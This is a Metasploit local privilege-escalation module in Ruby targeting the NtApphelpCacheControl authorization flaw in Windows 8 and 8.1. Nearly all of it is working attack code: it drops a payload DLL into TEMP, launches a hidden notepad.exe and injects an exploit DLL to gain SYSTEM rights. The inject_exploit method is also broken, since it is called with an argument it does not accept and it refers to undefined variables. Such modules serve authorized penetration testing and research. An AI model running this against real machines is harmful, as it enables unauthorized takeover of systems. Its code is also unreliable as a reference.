##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/reflective_dll_injection'

class Metasploit3 < Msf::Exploit::Local
  Rank = NormalRanking

  include Exploit::EXE
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      'Name'           => 'Windows NtApphelpCacheControl Improper Authorization Check',
      'Description'    => %q{
        On Windows, the system call NtApphelpCacheControl (the code is actually in ahcache.sys)
        allows application compatibility data to be cached for quick reuse when new processes are
        created. A normal user can query the cache but cannot add new cached entries as the
        operation is restricted to administrators. This is checked in the function
        AhcVerifyAdminContext.

        This function has a vulnerability where it doesn't correctly check the impersonation token
        of the caller to determine if the user is an administrator. It reads the caller's
        impersonation token using PsReferenceImpersonationToken and then does a comparison between
        the user SID in the token to LocalSystem's SID. It doesn't check the impersonation level
        of the token so it's possible to get an identify token on your thread from a local system
        process and bypass this check.

        This module currently only affects Windows 8 and Windows 8.1, and requires access to
        C:\Windows\System\ComputerDefaults.exe (although this can be improved).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'James Forshaw',
          'sinn3r'
        ],
      'Platform'       => 'win',
      'SessionTypes'   => [ 'meterpreter' ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Targets'        =>
        [
          [ 'Windows 8 / Windows 8.1 (x86)', { 'Arch' => ARCH_X86    }],
          [ 'Windows 8 / Windows 8.1 (x64)', { 'Arch' => ARCH_X86_64 }]
        ],
      'Payload'        =>
        {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'References'     =>
        [
          [ 'OSVEB', '116497' ],
          [ 'EDB', '35661' ],
          [ 'URL', 'https://code.google.com/p/google-security-research/issues/detail?id=118']
        ],
      'DisclosureDate' => 'Sep 30 2014'
    }))
  end

  def temp
    @temp ||= get_env('TEMP').to_s
  end

  def env_var_name
    # If you want to change this, make sure you change the one in exploit.cpp too
    'PAYLOAD_PATH'
  end

  def upload_payload_dll(payload_filepath)
    payload = generate_payload_dll({:dll_exitprocess => true})
    begin
      write_file(payload_filepath, payload)
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(
          Failure::Unknown,
          "Error uploading file #{payload_filepath}: #{e.class} #{e}"
      )
    end
  end

  def set_filepath_env(payload_filepath)
    ret = session.railgun.kernel32.SetEnvironmentVariableA(env_var_name, payload_filepath)
    if !ret['return']
      fail_with(Failure::Unknown, "Failed to set environment variable #{env_var_name}")
    end
  end

  def upload_payload
    payload_filepath = "#{temp}\\#{Rex::Text.rand_text_alpha(6)}.dll"
    print_status("Payload DLL will be: #{payload_filepath}")

    # Save the payload DLL's file path so the exploit can find it
    set_filepath_env(payload_filepath)

    # Upload the payload
    upload_payload_dll(payload_filepath)
    if !file?(payload_filepath)
      fail_with(Failure::Unknown, "Failed to save the payload DLL, or got removed. No idea why.")
    end
  end

  def inject_exploit
    case target.arch.first
    when ARCH_X86
      dll_name = 'exploit_x86.dll'
    when ARCH_X86_64
      dll_name = 'exploit_x64.dll'
    else
      fail_with(Failure::Unknown, "Unknown target selected.")
    end

    lib_file_path = ::File.join(
      Msf::Config.data_directory, "exploits", "ntapphelpcachecontrol", dll_name
    )

    exploit_mem, offset = inject_dll_into_process(process, library_path)
    process.thread.create(exploit_mem + offset)
  end

  def prep_exploit_host
    process = nil
    notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
    rescue Rex::Post::Meterpreter::RequestError
      process = client.sys.process.open
    rescue ::Exception => e
      elog("#{e.message}\nCall stack:\n#{e.backtrace.join("\n")}")
    end
    process
  end

  def check
    if sysinfo['OS'] =~ /Windows 8/
      # Still an 0day, but since this check doesn't actually trigger the vulnerability
      # so we should only flag this as CheckCode::Appears
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Uploading the payload DLL")
    upload_payload

    proc = prep_exploit_host
    if !proc
      fail_with(Failure::Unknown, "Fail to get a notepad.exe to run (to host the exploit)")
    end

    print_status("Injecting exploit into #{proc.pid}")
    inject_exploit(proc)
  end


end
